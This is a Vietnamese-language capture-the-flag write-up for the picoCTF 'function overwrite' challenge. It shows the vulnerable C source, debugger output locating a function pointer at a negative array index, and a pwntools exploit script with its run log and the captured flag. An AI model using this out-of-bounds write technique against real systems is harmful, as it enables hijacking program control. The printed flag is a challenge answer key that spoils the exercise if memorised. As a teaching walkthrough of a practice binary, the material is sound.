# Function overwrite
### Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}

void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}
void (*check)(char*, size_t) = hard_checker; // dong nay de lam gi
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}

int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}

```
### Analysis

Ta có hàm `main` chỉ có chức năng là gọi `vuln`. Kế tiếp là hàm `vuln`, đầu tiên nó bắt mình nhập `input` có độ lơn `127 byte `rồi sau đó bắt nhập tiếp 2 số, `num1` phải nhỏ hơn `10`, k biết để làm gì =)). Rồi sau đó, sẽ lấy `fun[num1] + num2`. Cuối cùng gọi đến `check`. `Check` đang trỏ tới hàm `hard_checker`. `Hard_checker` sẽ cộng từng phần tử trong `input` ta nhập lần đầu tiên vào, nếu bằng `13371337` thì sẽ in ra `flag`. Điều này là không khả thi. Ký tự có giá trị lớn nhất cũng chỉ có `128` mà ta chỉ có thể nhập `128` ký tự nên giá tối đa có thể nhập là `16,384` hoàn toàn không thể thỏa mãn được điều kiện. Chắc cũng chính vì thế mà hàm `easy_checker` đc tạo ra, với điều kiện bé hơn - chỉ là `1337` nên hoàn toàn có thể pass. Vấn đề là làm sao để có thể gọi được `easy_checker` thay vì `hard_checker`? 

Với 2 dữ kiện đề bài cho: `Array_bound` và `function overwrite` tớ nghĩ có thể lợi dụng được 

```c
 if (num1 < 10)
  {
    fun[num1] += num2;
  }
```
Để tiến hành overwrite `check` trỏ tới `easy_checker`, đầu tiên phải kiểm tra được `check` đang nằm ở đâu so với `fun`

```java
gef➤  info var
All defined variables:

Non-debugging symbols:
0x0804a000  _fp_hw
0x0804a004  _IO_stdin_used
0x0804a160  __GNU_EH_FRAME_HDR
0x0804a398  __FRAME_END__
0x0804bf08  __frame_dummy_init_array_entry
0x0804bf08  __init_array_start
0x0804bf0c  __do_global_dtors_aux_fini_array_entry
0x0804bf0c  __init_array_end
0x0804bf10  _DYNAMIC
0x0804c000  _GLOBAL_OFFSET_TABLE_
0x0804c038  __data_start
0x0804c038  data_start
0x0804c03c  __dso_handle
0x0804c040  check   <------ đây
0x0804c044  __TMC_END__
0x0804c044  __bss_start
0x0804c044  _edata
0x0804c060  completed
0x0804c080  fun     <------ đây nữa
0x0804c0a8  _end
gef➤  p/d 0x0804c080 - 0x0804c040
$1 = 64
```

Vậy `check` cách `fun` 1 khoảng `64 byte`. Nhưng do `fun` là mảng `int` với mỗi phần tử lớn `4 byte` và `check` nằm ở phía dưới của `fun` nên `check` sẽ ở phần tử `fun[-16]`. Tiếp theo có thể lợi dụng được phép cộng trong câu điều kiện if trên để `overwrite` `hard_checker` thành `easy_checker`. Trước tiên phải tìm được `offset` giữa 2 bên:

```java
gef➤  p easy_checker
$2 = {<text variable, no debug info>} 0x80492fc <easy_checker>
gef➤  p hard_checker
$3 = {<text variable, no debug info>} 0x8049436 <hard_checker>
gef➤  p/d 0x8049436 - 0x80492fc
$4 = 314
```
Vậy `check` phải trừ đi 1 khoảng 314 để có thể `overwrite` thành `easy_checker`. Và input ta phải nhập lần đầu sao cho cộng lại thành `1337` là được, ở đây tớ dùng `b'~'*10 + b'M'` do 1 ký tự '~' là 127 và M là 77 cộng lại vừa đủ 1337

### Exploit

```python
from pwn import *

p = remote('saturn.picoctf.net', 63574)
payload = b'~'*10 + b'M'
p.sendlineafter(b'>> ',payload)
p.sendlineafter(b'\n', b'-16 -314')
p.recvall()
p.interactive()
```
```java
trungdo@TEFO: /function_over_write$ python3 bruhh.py DEBUG
[+] Opening connection to saturn.picoctf.net on port 63574: Done
[DEBUG] Received 0x3b bytes:
    b"Tell me a story and then I'll tell you if you're a 1337 >> "
[DEBUG] Sent 0xc bytes:
    b'~~~~~~~~~~M\n'
[DEBUG] Received 0x53 bytes:
    b'On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n'
[DEBUG] Sent 0x9 bytes:
    b'-16 -314\n'
[+] Receiving all data: Done (69B)
[DEBUG] Received 0x45 bytes:
    b"You're 1337. Here's the flag.\n"
    b'picoCTF{0v3rwrit1ng_P01nt3rs_529bfb38}\n'
[*] Closed connection to saturn.picoctf.net port 63574
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```
`flag: picoCTF{0v3rwrit1ng_P01nt3rs_529bfb38}`
